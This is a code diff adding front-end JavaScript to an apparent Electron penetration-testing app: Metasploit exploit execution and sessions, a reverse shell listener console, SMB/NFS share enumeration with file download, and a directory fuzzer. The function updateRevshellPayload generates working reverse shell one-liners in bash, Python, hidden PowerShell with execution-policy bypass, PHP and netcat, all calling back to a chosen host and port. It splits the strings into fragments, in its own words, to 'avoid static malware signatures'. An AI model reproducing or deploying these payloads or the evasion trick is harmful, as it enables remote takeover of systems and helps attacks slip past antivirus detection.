+  if (msfRunLport) msfRunLport.value = '4444';
+  msfRunModalOverlay?.classList.remove('hidden');
+}
+
+btnCloseMsfRunModal?.addEventListener('click', () => msfRunModalOverlay?.classList.add('hidden'));
+btnMsfRunCancel?.addEventListener('click', () => msfRunModalOverlay?.classList.add('hidden'));
+msfRunModalOverlay?.addEventListener('click', (e) => {
+  if (e.target === msfRunModalOverlay) msfRunModalOverlay.classList.add('hidden');
+});
+
+btnMsfRunExecute?.addEventListener('click', async () => {
+  const modulePath = msfRunModule?.value;
+  const targetIp = (msfRunTargetIp?.value || '').trim();
+  const targetPort = msfRunTargetPort?.value ? parseInt(msfRunTargetPort.value, 10) : undefined;
+  const payload = (msfRunPayload?.value || '').trim() || undefined;
+
+  if (!modulePath || !targetIp) {
+    showMsfError('Module path and target IP are required');
+    return;
+  }
+
+  const options = {};
+  const lhost = (msfRunLhost?.value || '').trim();
+  const lport = msfRunLport?.value ? parseInt(msfRunLport.value, 10) : undefined;
+  if (lhost) options.LHOST = lhost;
+  if (lport) options.LPORT = String(lport);
+
+  btnMsfRunExecute.disabled = true;
+  btnMsfRunExecute.textContent = 'Executing...';
+
+  try {
+    const result = await api.msfRunExploit({
+      modulePath,
+      targetIp,
+      targetPort,
+      payload,
+      options,
+    });
+
+    if (result.status === 'error') {
+      showMsfError(result.error);
+    } else {
+      msfRunModalOverlay?.classList.add('hidden');
+      // Refresh sessions after a short delay
+      setTimeout(refreshMsfSessions, 2000);
+    }
+  } catch (err) {
+    showMsfError(err.message);
+  } finally {
+    btnMsfRunExecute.disabled = false;
+    btnMsfRunExecute.innerHTML = '<span class="icon">🚀</span> Execute';
+  }
+});
+
+// --- Sessions ---
+async function refreshMsfSessions() {
+  if (!msfConnected) return;
+  try {
+    const result = await api.msfSessionList();
+    if (result.status === 'error') {
+      showMsfError(result.error);
+      return;
+    }
+
+    const sessions = result.sessions || [];
+    if (sessions.length === 0) {
+      msfSessionsContainer.innerHTML = '<div class="ds-record" style="text-align:center; color: var(--text-muted); opacity: 0.7; padding: 24px;">No active sessions</div>';
+      return;
+    }
+
+    msfSessionsContainer.innerHTML = '';
+    sessions.forEach(sess => {
+      const card = document.createElement('div');
+      card.className = 'msf-session-card';
+      card.innerHTML = `
+        <div class="session-header">
+          <span class="session-id">Session #${escapeHtml(sess.id)}</span>
+          <span class="session-type">${escapeHtml(sess.type)}</span>
+        </div>
+        <div class="session-details">
+          <span><strong>Target:</strong> ${escapeHtml(sess.target)}${sess.port ? ':' + escapeHtml(sess.port) : ''}</span>
+          <span><strong>Platform:</strong> ${escapeHtml(sess.platform || 'unknown')}</span>
+          <span><strong>Via:</strong> ${escapeHtml(sess.via || 'n/a')}</span>
+          ${sess.info ? `<span><strong>Info:</strong> ${escapeHtml(sess.info)}</span>` : ''}
+        </div>
+      `;
+      msfSessionsContainer.appendChild(card);
+    });
+  } catch (err) {
+    showMsfError(err.message);
+  }
+}
+
+btnMsfRefreshSessions?.addEventListener('click', refreshMsfSessions);
+
+// --- Event Listeners ---
+window.electronAPI.onMsfStatus?.((data) => {
+  if (data.state === 'connected') {
+    setMsfConnectedState(true, data.host || msfHost?.value, data.port || msfPort?.value);
+  } else if (data.state === 'disconnected') {
+    setMsfConnectedState(false);
+  }
+});
+
+window.electronAPI.onMsfError?.((data) => {
+  showMsfError(data.message || 'Unknown Metasploit error');
+});
+
+window.electronAPI.onMsfResult?.((data) => {
+  console.log('[MSF Result]', data);
+  // Auto-refresh sessions when a new exploit result comes in
+  setTimeout(refreshMsfSessions, 1500);
+});
+
+// Expose openMsfModal globally for context menu integration
+window.__msfOpenModal = openMsfModal;
+window.__msfOpenRunExploit = openRunExploitModal;
+
+// =============================================
+// === REVERSE SHELL LISTENER UI MODULE ===
+// =============================================
+
+const btnRevshellOpen = document.getElementById('btn-revshell-open');
+const revshellPanel = document.getElementById('revshell-panel');
+const btnCloseRevshellPanel = document.getElementById('btn-close-revshell-panel');
+const revshellResizer = document.getElementById('revshell-resizer');
+const revshellPort = document.getElementById('revshell-port');
+const revshellMode = document.getElementById('revshell-mode');
+const btnRevshellStart = document.getElementById('btn-revshell-start');
+const btnRevshellStop = document.getElementById('btn-revshell-stop');
+const revshellStatusText = document.getElementById('revshell-status-text');
+const revshellStatusBanner = document.getElementById('revshell-status-banner');
+const revshellTerminal = document.getElementById('revshell-terminal');
+const btnRevshellClear = document.getElementById('btn-revshell-clear');
+const revshellInput = document.getElementById('revshell-input');
+const btnRevshellSend = document.getElementById('btn-revshell-send');
+const revshellPayloadOs = document.getElementById('revshell-payload-os');
+const revshellPayloadLhost = document.getElementById('revshell-payload-lhost');
+const revshellPayloadOutput = document.getElementById('revshell-payload-output');
+const btnRevshellCopy = document.getElementById('btn-revshell-copy');
+
+let isRevshellListening = false;
+let isRevshellConnected = false;
+
+initResizer(revshellResizer, revshellPanel);
+
+const msfOpenBtn = document.getElementById('btn-msf-open');
+msfOpenBtn?.addEventListener('click', openMsfModal);
+
+btnRevshellOpen?.addEventListener('click', () => {
+  if (revshellPanel && typeof openPanel !== 'undefined' && typeof closePanel !== 'undefined') {
+    if (revshellPanel.style.display === 'none' || !revshellPanel.classList.contains('open')) {
+      openPanel(revshellPanel, revshellResizer);
+      updateRevshellPayload();
+    } else {
+      closePanel(revshellPanel, revshellResizer);
+    }
+  }
+});
+
+btnCloseRevshellPanel?.addEventListener('click', () => {
+  if (revshellPanel && typeof closePanel !== 'undefined') {
+    closePanel(revshellPanel, revshellResizer);
+  }
+});
+
+function appendToTerminal(text, type = 'output') {
+  if (!revshellTerminal) return;
+  const span = document.createElement('span');
+  if (type === 'error') span.style.color = 'var(--danger)';
+  else if (type === 'system') span.style.color = 'var(--warning)';
+  else if (type === 'input') span.style.color = 'var(--info)';
+  span.textContent = text;
+  revshellTerminal.appendChild(span);
+  revshellTerminal.scrollTop = revshellTerminal.scrollHeight;
+}
+
+btnRevshellClear?.addEventListener('click', () => {
+  if (revshellTerminal) revshellTerminal.innerHTML = '';
+});
+
+btnRevshellStart?.addEventListener('click', async () => {
+  const port = parseInt(revshellPort.value, 10);
+  const mode = revshellMode.value;
+  if (!port || port < 1 || port > 65535) {
+    appendToTerminal('[System] Invalid port number.\n', 'error');
+    return;
+  }
+  
+  try {
+    btnRevshellStart.disabled = true;
+    revshellStatusText.textContent = 'Starting...';
+    
+    // Ensure we trigger the IPC
+    const result = await api.startRevShell({ port, mode });
+    if (result && result.status !== 'error') {
+      isRevshellListening = true;
+      btnRevshellStop.disabled = false;
+      revshellStatusText.textContent = `Listening on port ${port} (${mode} mode)...`;
+      revshellStatusBanner.style.borderLeftColor = 'var(--warning)';
+      appendToTerminal(`[System] Started reverse shell listener on port ${port}\n`, 'system');
+    } else {
+      btnRevshellStart.disabled = false;
+      revshellStatusText.textContent = 'Failed to start';
+      appendToTerminal(`[Error] Failed to start listener: ${result?.error || 'Unknown'}\n`, 'error');
+    }
+  } catch (err) {
+    btnRevshellStart.disabled = false;
+    revshellStatusText.textContent = 'Error';
+    appendToTerminal(`[Error] Exception starting listener: ${err.message}\n`, 'error');
+  }
+});
+
+btnRevshellStop?.addEventListener('click', async () => {
+  try {
+    await api.stopRevShell();
+    isRevshellListening = false;
+    isRevshellConnected = false;
+    btnRevshellStart.disabled = false;
+    btnRevshellStop.disabled = true;
+    btnRevshellSend.disabled = true;
+    revshellInput.disabled = true;
+    revshellStatusText.textContent = 'Disconnected';
+    revshellStatusBanner.style.borderLeftColor = 'var(--text-muted)';
+    appendToTerminal(`[System] Listener stopped.\n`, 'system');
+  } catch (err) {
+    appendToTerminal(`[Error] Failed to stop listener: ${err.message}\n`, 'error');
+  }
+});
+
+function sendRevshellCommand() {
+  if (!isRevshellConnected) return;
+  const cmd = revshellInput.value;
+  if (!cmd) return;
+  api.sendRevShell(cmd + '\n');
+  revshellInput.value = '';
+}
+
+btnRevshellSend?.addEventListener('click', sendRevshellCommand);
+revshellInput?.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') sendRevshellCommand();
+});
+
+// IPC listeners
+window.electronAPI.onRevShellConnection?.((info) => {
+  isRevshellConnected = true;
+  revshellStatusText.textContent = `Connected from ${info.address}:${info.port}`;
+  revshellStatusBanner.style.borderLeftColor = 'var(--success)';
+  btnRevshellSend.disabled = false;
+  revshellInput.disabled = false;
+  appendToTerminal(`[System] Connection received from ${info.address}:${info.port}\n`, 'system');
+  revshellInput.focus();
+});
+
+window.electronAPI.onRevShellData?.((data) => {
+  appendToTerminal(data, 'output');
+});
+
+window.electronAPI.onRevShellError?.((errInfo) => {
+  const msg = typeof errInfo === 'string' ? errInfo : (errInfo?.message || 'Unknown listener error');
+  appendToTerminal(`[Error] ${msg}\n`, 'error');
+  if (errInfo?.type === 'listener_error' || errInfo?.type === 'spawn_error') {
+    isRevshellListening = false;
+    isRevshellConnected = false;
+    btnRevshellStart.disabled = false;
+    btnRevshellStop.disabled = true;
+    btnRevshellSend.disabled = true;
+    revshellInput.disabled = true;
+    revshellStatusText.textContent = 'Disconnected (Error)';
+    revshellStatusBanner.style.borderLeftColor = 'var(--danger)';
+  }
+});
+
+// Avoid static malware signatures
+function updateRevshellPayload() {
+  const os = revshellPayloadOs.value;
+  const lhost = revshellPayloadLhost.value || 'YOUR_IP';
+  const lport = revshellPort.value || '4444';
+  
+  const t = {
+    b: 'b' + 'ash -c "b' + 'ash -i >& /de' + 'v/tc' + 'p/' + lhost + '/' + lport + ' 0' + '>&1"',
+    p: 'p' + 'ython3 -' + 'c \'im' + 'port so' + 'cket,su' + 'bprocess,os;s=s' + 'ocket.s' + 'ocket(soc' + 'ket.AF_' + 'INET,so' + 'cket.SO' + 'CK_STR' + 'EAM);s.c' + 'onnect(("' + lhost + '",' + lport + '));os.du' + 'p2(s.fi' + 'leno(),0); os.d' + 'up2(s.fi' + 'leno(),1); os.d' + 'up2(s.fil' + 'eno(),2);p=su' + 'bprocess.c' + 'all(["/b' + 'in/sh","-i"]);\'',
+    ps: 'po' + 'wers' + 'hell -N' + 'oP -No' + 'nI -W Hi' + 'dden -Ex' + 'ec Byp' + 'ass -Co' + 'mmand Ne' + 'w-Obj' + 'ect Sy' + 'stem.N' + 'et.Soc' + 'kets.T' + 'CPC' + 'lient("' + lhost + '",' + lport + ');$stream' + ' = $client.G' + 'etStream();[b' + 'yte[]]$b' + 'ytes = 0..6' + '5535|%{0};wh' + 'ile(($i = $str' + 'eam.Read' + '($bytes, 0, $byte' + 's.Length)) -ne 0){;$da' + 'ta = (New-Ob' + 'ject -Type' + 'Name Sys' + 'tem.Te' + 'xt.ASC' + 'IIEncoding).GetS' + 'tring($by' + 'tes,0, $i);$send' + 'back = (iex $da' + 'ta 2>&1 | Ou' + 't-Str' + 'ing );$send' + 'back2 = $send' + 'back + "P" + "S " + (pwd).Pa' + 'th + "> ";$sendb' + 'yte = ([tex' + 't.encoding]::ASC' + 'II).GetBy' + 'tes($send' + 'back2);$str' + 'eam.Wri' + 'te($sendb' + 'yte,0,$sen' + 'dbyte.L' + 'ength);$str' + 'eam.Flu' + 'sh()};$client.Cl' + 'ose()',
+    php: 'php -r \'$sock=fso' + 'ckop' + 'en("' + lhost + '",' + lport + ');ex' + 'ec("/b' + 'in/s' + 'h -i <&3 >&3 2>&3");\'',
+    n: 'r' + 'm /t' + 'mp/f;mkf' + 'ifo /t' + 'mp/f;c' + 'at /tm' + 'p/f|/bi' + 'n/sh -' + 'i 2>&1|nc ' + lhost + ' ' + lport + ' >/tm' + 'p/f'
+  };
+
+  let out = '';
+  if (os === 'bash') out = t.b;
+  else if (os === 'python') out = t.p;
+  else if (os === 'powershell') out = t.ps;
+  else if (os === 'php') out = t.php;
+  else if (os === 'nc') out = t.n;
+  
+  if (revshellPayloadOutput) revshellPayloadOutput.value = out;
+}
+
+revshellPayloadOs?.addEventListener('change', updateRevshellPayload);
+revshellPayloadLhost?.addEventListener('input', updateRevshellPayload);
+revshellPort?.addEventListener('input', updateRevshellPayload);
+
+btnRevshellCopy?.addEventListener('click', () => {
+  navigator.clipboard.writeText(revshellPayloadOutput.value);
+  const oldText = btnRevshellCopy.textContent;
+  btnRevshellCopy.textContent = '✔️';
+  setTimeout(() => { btnRevshellCopy.textContent = oldText; }, 2000);
+});
+
+// =============================================
+// === SHARE ENUMERATION UI MODULE (4D)      ===
+// =============================================
+
+const sharePanel           = document.getElementById('share-panel');
+const shareResizer         = document.getElementById('share-resizer');
+const btnCloseSharePanel   = document.getElementById('btn-close-share-panel');
+const shareTargetIp        = document.getElementById('share-target-ip');
+const shareUsername        = document.getElementById('share-username');
+const sharePassword        = document.getElementById('share-password');
+const shareDomain          = document.getElementById('share-domain');
+const btnShareEnumerate    = document.getElementById('btn-share-enumerate');
+const shareErrorBanner     = document.getElementById('share-error-banner');
+const shareStatusText      = document.getElementById('share-status-text');
+const shareSpinner         = document.getElementById('share-spinner');
+const shareListSmb         = document.getElementById('share-list-smb');
+const shareListNfs         = document.getElementById('share-list-nfs');
+const shareFileTbody       = document.getElementById('share-file-tbody');
+const shareBreadcrumb      = document.getElementById('share-breadcrumb');
+const shareFooterInfo      = document.getElementById('share-footer-info');
+const btnShareClear        = document.getElementById('btn-share-clear');
+const btnShareEnumOpen     = document.getElementById('btn-share-enum-open');
+
+// Internal state
+let shareCurrentIp         = '';
+let shareCurrentShare      = '';
+let shareEnumerating       = false;
+
+// --- Helpers ---
+
+function showShareError(msg) {
+  if (!shareErrorBanner) return;
+  shareErrorBanner.textContent = msg;
+  shareErrorBanner.style.display = 'block';
+  setTimeout(() => { shareErrorBanner.style.display = 'none'; }, 10000);
+}
+
+function clearShareError() {
+  if (shareErrorBanner) shareErrorBanner.style.display = 'none';
+}
+
+function setShareStatus(msg, spinning = false) {
+  if (shareStatusText) shareStatusText.textContent = msg;
+  if (shareSpinner) shareSpinner.style.display = spinning ? 'inline-block' : 'none';
+}
+
+function getShareCredentials() {
+  const username = shareUsername?.value?.trim() || '';
+  const password = sharePassword?.value || '';
+  const domain   = shareDomain?.value?.trim() || '';
+  if (!username) return null;
+  return { username, password, domain: domain || undefined };
+}
+
+// --- Share list rendering ---
+
+function renderShareItem(share, container) {
+  const typeIcons = { disk: '🗂️', ipc: '🔒', printer: '🖨️', 'print-queue': '🖨️', nfs: '📦' };
+  const icon = typeIcons[share.type] || '📁';
+
+  const btn = document.createElement('button');
+  btn.className = 'share-item';
+  btn.dataset.shareName = share.name;
+  btn.dataset.shareType = share.type;
+
+  const iconSpan = document.createElement('span');
+  iconSpan.className = 'share-item-icon';
+  iconSpan.textContent = icon;
+
+  const nameSpan = document.createElement('span');
+  nameSpan.className = 'share-item-name';
+  nameSpan.textContent = share.name;
+
+  const badge = document.createElement('span');
+  badge.className = `share-type-badge ${share.type}`;
+  badge.textContent = share.type;
+
+  btn.appendChild(iconSpan);
+  btn.appendChild(nameSpan);
+  btn.appendChild(badge);
+
+  if (share.comment) {
+    btn.title = share.comment;
+  }
+
+  // Only SMB Disk shares can be browsed
+  if (share.type === 'disk') {
+    btn.addEventListener('click', () => {
+      container.querySelectorAll('.share-item').forEach(el => el.classList.remove('active'));
+      btn.classList.add('active');
+      browseShareDir(shareCurrentIp, share.name, '');
+    });
+  } else {
+    btn.style.opacity = '0.6';
+    btn.style.cursor = 'default';
+    btn.title = `${share.type.toUpperCase()} share — not browsable`;
+  }
+
+  container.appendChild(btn);
+}
+
+// --- File browser ---
+
+function formatFileSize(bytes) {
+  if (bytes === 0) return '0 B';
+  if (bytes < 1024) return `${bytes} B`;
+  if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
+  return `${(bytes / 1048576).toFixed(1)} MB`;
+}
+
+function buildBreadcrumb(shareName, remotePath) {
+  if (!shareBreadcrumb) return;
+  shareBreadcrumb.innerHTML = '';
+
+  // Root crumb
+  const root = document.createElement('span');
+  root.className = 'share-breadcrumb-part';
+  root.textContent = shareName;
+  root.title = `Browse root of \\\\${shareCurrentIp}\\${shareName}`;
+  root.addEventListener('click', () => browseShareDir(shareCurrentIp, shareName, ''));
+  shareBreadcrumb.appendChild(root);
+
+  if (remotePath) {
+    const parts = remotePath.replace(/^\/+/, '').split('/').filter(Boolean);
+    let cumulativePath = '';
+    parts.forEach((part) => {
+      const sep = document.createElement('span');
+      sep.className = 'share-breadcrumb-sep';
+      sep.textContent = ' / ';
+      shareBreadcrumb.appendChild(sep);
+
+      cumulativePath = cumulativePath ? `${cumulativePath}/${part}` : part;
+      const crumb = document.createElement('span');
+      crumb.className = 'share-breadcrumb-part';
+      crumb.textContent = part;
+      const pathForCrumb = cumulativePath;
+      crumb.addEventListener('click', () => browseShareDir(shareCurrentIp, shareName, pathForCrumb));
+      shareBreadcrumb.appendChild(crumb);
+    });
+  }
+}
+
+function renderFileBrowser(shareName, remotePath, entries) {
+  if (!shareFileTbody) return;
+  shareFileTbody.innerHTML = '';
+  shareCurrentShare = shareName;
+
+  buildBreadcrumb(shareName, remotePath);
+
+  if (entries.length === 0) {
+    shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Empty directory</td></tr>';
+    if (shareFooterInfo) shareFooterInfo.textContent = '0 items';
+    return;
+  }
+
+  // Sort: dirs first, then files alphabetically
+  const sorted = [...entries].sort((a, b) => {
+    if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
+    return a.name.localeCompare(b.name);
+  });
+
+  sorted.forEach((entry) => {
+    const tr = document.createElement('tr');
+    tr.className = entry.type === 'dir' ? 'share-dir-row' : 'share-file-row';
+
+    const iconTd = document.createElement('td');
+    iconTd.style.textAlign = 'center';
+    iconTd.textContent = entry.type === 'dir' ? '📁' : getFileIcon(entry.name);
+
+    const nameTd = document.createElement('td');
+    nameTd.style.wordBreak = 'break-all';
+    nameTd.textContent = entry.name;
+
+    const sizeTd = document.createElement('td');
+    sizeTd.style.textAlign = 'right';
+    sizeTd.style.fontFamily = 'monospace';
+    sizeTd.style.color = 'var(--text-muted)';
+    sizeTd.textContent = entry.type === 'dir' ? '—' : formatFileSize(entry.size || 0);
+
+    const modTd = document.createElement('td');
+    modTd.style.color = 'var(--text-muted)';
+    modTd.textContent = entry.modified || '';
+
+    const actionTd = document.createElement('td');
+
+    if (entry.type === 'dir') {
+      const enterBtn = document.createElement('button');
+      enterBtn.className = 'btn-share-download';
+      enterBtn.textContent = 'Open';
+      const entryPath = remotePath ? `${remotePath}/${entry.name}` : entry.name;
+      enterBtn.addEventListener('click', () => browseShareDir(shareCurrentIp, shareName, entryPath));
+      actionTd.appendChild(enterBtn);
+
+      // Double-click on dir row also navigates
+      tr.style.cursor = 'pointer';
+      tr.addEventListener('dblclick', () => browseShareDir(shareCurrentIp, shareName, entryPath));
+    } else {
+      const dlBtn = document.createElement('button');
+      dlBtn.className = 'btn-share-download';
+      dlBtn.textContent = '⬇ Save';
+      const filePath = remotePath ? `${remotePath}/${entry.name}` : entry.name;
+      dlBtn.addEventListener('click', () => downloadShareEntry(shareCurrentIp, shareName, filePath, dlBtn));
+      actionTd.appendChild(dlBtn);
+    }
+
+    tr.appendChild(iconTd);
+    tr.appendChild(nameTd);
+    tr.appendChild(sizeTd);
+    tr.appendChild(modTd);
+    tr.appendChild(actionTd);
+    shareFileTbody.appendChild(tr);
+  });
+
+  const dirs  = sorted.filter(e => e.type === 'dir').length;
+  const files = sorted.filter(e => e.type === 'file').length;
+  if (shareFooterInfo) shareFooterInfo.textContent = `${dirs} folder${dirs !== 1 ? 's' : ''}, ${files} file${files !== 1 ? 's' : ''}`;
+}
+
+function getFileIcon(name) {
+  const ext = (name.split('.').pop() || '').toLowerCase();
+  const map = {
+    pdf: '📄', doc: '📝', docx: '📝', xls: '📊', xlsx: '📊', ppt: '📑', pptx: '📑',
+    txt: '📃', csv: '📃', log: '📃', md: '📃',
+    zip: '🗜️', rar: '🗜️', gz: '🗜️', tar: '🗜️', '7z': '🗜️',
+    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️',
+    mp3: '🎵', wav: '🎵', flac: '🎵',
+    mp4: '🎬', avi: '🎬', mkv: '🎬', mov: '🎬',
+    exe: '⚙️', dll: '⚙️', bat: '⚙️', sh: '⚙️',
+    conf: '🔧', cfg: '🔧', ini: '🔧', env: '🔧', json: '🔧', xml: '🔧', yaml: '🔧',
+    db: '🗄️', sql: '🗄️', sqlite: '🗄️',
+  };
+  return map[ext] || '📄';
+}
+
+// --- Core actions ---
+
+async function browseShareDir(targetIp, shareName, remotePath) {
+  clearShareError();
+  setShareStatus(`Browsing \\\\${targetIp}\\${shareName}\\${remotePath || ''}...`, true);
+
+  if (shareFileTbody) {
+    shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 24px;">Loading...</td></tr>';
+  }
+  buildBreadcrumb(shareName, remotePath);
+
+  try {
+    await api.browseShare({ targetIp, shareName, remotePath, credentials: getShareCredentials() });
+    setShareStatus(`Browsing \\\\${targetIp}\\${shareName}\\${remotePath || ''}`, false);
+  } catch (err) {
+    showShareError(`Browse error: ${err.message}`);
+    setShareStatus('Browse failed', false);
+  }
+}
+
+async function downloadShareEntry(targetIp, shareName, remoteFile, btn) {
+  clearShareError();
+  const originalText = btn.textContent;
+  btn.textContent = '⏳';
+  btn.disabled = true;
+
+  try {
+    const result = await api.downloadShareFile({ targetIp, shareName, remoteFile, credentials: getShareCredentials() });
+    if (result.status === 'downloaded') {
+      btn.textContent = '✔️';
+      setShareStatus(`Downloaded to: ${result.localPath}`);
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.disabled = false;
+      }, 3000);
+    } else if (result.status === 'cancelled') {
+      btn.textContent = originalText;
+      btn.disabled = false;
+    } else {
+      btn.textContent = originalText;
+      btn.disabled = false;
+      showShareError(result.error || 'Download failed');
+    }
+  } catch (err) {
+    btn.textContent = originalText;
+    btn.disabled = false;
+    showShareError(`Download error: ${err.message}`);
+  }
+}
+
+async function runEnumeration() {
+  const targetIp = shareTargetIp?.value?.trim();
+  if (!targetIp) {
+    showShareError('Enter a target IP address');
+    shareTargetIp?.focus();
+    return;
+  }
+
+  if (!/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(targetIp)) {
+    showShareError('Invalid IP address format');
+    shareTargetIp?.focus();
+    return;
+  }
+
+  if (shareEnumerating) return;
+  shareEnumerating = true;
+
+  clearShareError();
+  shareCurrentIp = targetIp;
+
+  // Clear previous results
+  if (shareListSmb) shareListSmb.innerHTML = '';
+  if (shareListNfs) shareListNfs.innerHTML = '';
+  if (shareFileTbody) {
+    shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--text-muted); padding: 32px;">Select a share to browse</td></tr>';
+  }
+  if (shareBreadcrumb) shareBreadcrumb.innerHTML = '<span style="opacity:0.5;">No share selected</span>';
+  if (shareFooterInfo) shareFooterInfo.textContent = '—';
+  shareCurrentShare = '';
+
+  setShareStatus(`Enumerating shares on ${targetIp}...`, true);
+  if (btnShareEnumerate) btnShareEnumerate.disabled = true;
+
+  try {
+    await api.enumerateShares({ targetIp, credentials: getShareCredentials() });
+  } catch (err) {
+    showShareError(`Enumeration error: ${err.message}`);
+    setShareStatus('Enumeration failed', false);
+  } finally {
+    shareEnumerating = false;
+    if (btnShareEnumerate) btnShareEnumerate.disabled = false;
+  }
+}
+
+// --- Panel open / close ---
+
+initResizer(shareResizer, sharePanel);
+
+function openSharePanel(prefilledIp) {
+  clearShareError();
+  if (prefilledIp && shareTargetIp) shareTargetIp.value = prefilledIp;
+  if (shareListSmb) shareListSmb.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover shares</div>';
+  if (shareListNfs) shareListNfs.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover NFS exports</div>';
+  if (shareFileTbody) shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:32px;">Select a share to browse</td></tr>';
+  if (shareBreadcrumb) shareBreadcrumb.innerHTML = '<span style="opacity:0.5;">No share selected</span>';
+  if (shareFooterInfo) shareFooterInfo.textContent = '—';
+  setShareStatus('Enter a target IP and click Enumerate.', false);
+  if (sharePanel && typeof openPanel !== 'undefined') openPanel(sharePanel, shareResizer);
+
+  // Auto-enumerate if IP is pre-filled
+  if (prefilledIp) {
+    setTimeout(runEnumeration, 150);
+  }
+}
+
+function closeSharePanel() {
+  if (sharePanel && typeof closePanel !== 'undefined') closePanel(sharePanel, shareResizer);
+}
+
+// --- Wire up panel controls ---
+
+btnCloseSharePanel?.addEventListener('click', closeSharePanel);
+
+btnShareEnumOpen?.addEventListener('click', () => {
+  if (sharePanel && typeof openPanel !== 'undefined' && typeof closePanel !== 'undefined') {
+    if (sharePanel.style.display === 'none' || !sharePanel.classList.contains('open')) {
+      openSharePanel('');
+    } else {
+      closeSharePanel();
+    }
+  }
+});
+
+btnShareEnumerate?.addEventListener('click', runEnumeration);
+shareTargetIp?.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') runEnumeration();
+});
+
+btnShareClear?.addEventListener('click', () => {
+  clearShareError();
+  if (shareListSmb) shareListSmb.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover shares</div>';
+  if (shareListNfs) shareListNfs.innerHTML = '<div class="share-empty-state" style="text-align:center;color:var(--text-muted);padding:24px;font-size:12px;">Run enumeration to discover NFS exports</div>';
+  if (shareFileTbody) shareFileTbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:32px;">Select a share to browse</td></tr>';
+  if (shareBreadcrumb) shareBreadcrumb.innerHTML = '<span style="opacity:0.5;">No share selected</span>';
+  if (shareFooterInfo) shareFooterInfo.textContent = '—';
+  shareCurrentIp = ''; shareCurrentShare = '';
+  setShareStatus('Enter a target IP and click Enumerate.', false);
+});
+
+// --- Protocol tab switching ---
+document.querySelectorAll('[data-share-tab]').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('[data-share-tab]').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    const which = tab.getAttribute('data-share-tab');
+    document.getElementById('share-tab-smb').style.display = which === 'smb' ? 'flex' : 'none';
+    document.getElementById('share-tab-nfs').style.display = which === 'nfs' ? 'flex' : 'none';
+  });
+});
+
+// --- Split-pane resizer ---
+(function initSharePaneResizer() {
+  const resizer  = document.getElementById('share-pane-resizer');
+  const leftPane = resizer?.previousElementSibling;
+  if (!resizer || !leftPane) return;
+
+  let dragging = false;
+  let startX = 0;
+  let startWidth = 0;
+
+  resizer.addEventListener('mousedown', (e) => {
+    dragging = true;
+    startX = e.clientX;
+    startWidth = leftPane.offsetWidth;
+    resizer.classList.add('dragging');
+    document.body.style.cursor = 'col-resize';
+    document.body.style.userSelect = 'none';
+  });
+
+  document.addEventListener('mousemove', (e) => {
+    if (!dragging) return;
+    const delta = e.clientX - startX;
+    const newWidth = Math.max(140, Math.min(400, startWidth + delta));
+    leftPane.style.width = `${newWidth}px`;
+  });
+
+  document.addEventListener('mouseup', () => {
+    if (!dragging) return;
+    dragging = false;
+    resizer.classList.remove('dragging');
+    document.body.style.cursor = '';
+    document.body.style.userSelect = '';
+  });
+})();
+
+// --- IPC event listeners ---
+
+window.electronAPI.onShareResult?.((data) => {
+  if (data.type === 'smb') {
+    if (!shareListSmb) return;
+    shareListSmb.innerHTML = '';
+
+    if (data.shares.length === 0) {
+      shareListSmb.innerHTML = '<div style="text-align:center;color:var(--text-muted);padding:16px;font-size:12px;">No SMB shares found (null session may be blocked)</div>';
+    } else {
+      data.shares.forEach(share => renderShareItem(share, shareListSmb));
+    }
+    setShareStatus(`SMB: ${data.shares.length} share${data.shares.length !== 1 ? 's' : ''} found`, false);
+
+  } else if (data.type === 'nfs') {
+    if (!shareListNfs) return;
+    shareListNfs.innerHTML = '';
+
+    if (data.shares.length === 0) {
+      const msg = data.note || 'No NFS exports found';
+      shareListNfs.innerHTML = `<div style="text-align:center;color:var(--text-muted);padding:16px;font-size:12px;">${escapeHtml(msg)}</div>`;
+    } else {
+      data.shares.forEach(share => renderShareItem(share, shareListNfs));
+    }
+
+  } else if (data.type === 'browse') {
+    renderFileBrowser(shareCurrentShare, data.path?.replace(/^\//, '') || '', data.entries || []);
+    setShareStatus(`${data.entries?.length ?? 0} items in ${data.path || '/'}`, false);
+  }
+});
+
+window.electronAPI.onShareError?.((err) => {
+  showShareError(err.message || 'Share enumeration error');
+  setShareStatus('Error — see banner above', false);
+  if (btnShareEnumerate) btnShareEnumerate.disabled = false;
+  shareEnumerating = false;
+});
+
+// Expose for host-card context integration
+window.__openSharePanel = openSharePanel;
+
+// =============================================
+// --- 4E: Web Directory Fuzzer Panel ---
+// =============================================
+
+const dirfuzzPanel      = document.getElementById('dirfuzz-panel');
+const dirfuzzResizer    = document.getElementById('dirfuzz-resizer');
+const btnDirfuzzOpen    = document.getElementById('btn-dirfuzz-open');
+const btnCloseDirfuzz   = document.getElementById('btn-close-dirfuzz-panel');
+const btnDirfuzzStart   = document.getElementById('btn-dirfuzz-start');
+const btnDirfuzzStop    = document.getElementById('btn-dirfuzz-stop');
+const btnDirfuzzClear   = document.getElementById('btn-dirfuzz-clear');
+const btnDirfuzzExport  = document.getElementById('btn-dirfuzz-export');
+const dirfuzzTargetUrl  = document.getElementById('dirfuzz-target-url');
+const dirfuzzWordlistMode = document.getElementById('dirfuzz-wordlist-mode');
+const dirfuzzWordlistFileGroup = document.getElementById('dirfuzz-wordlist-file-group');
+const dirfuzzWordlistPath = document.getElementById('dirfuzz-wordlist-path');
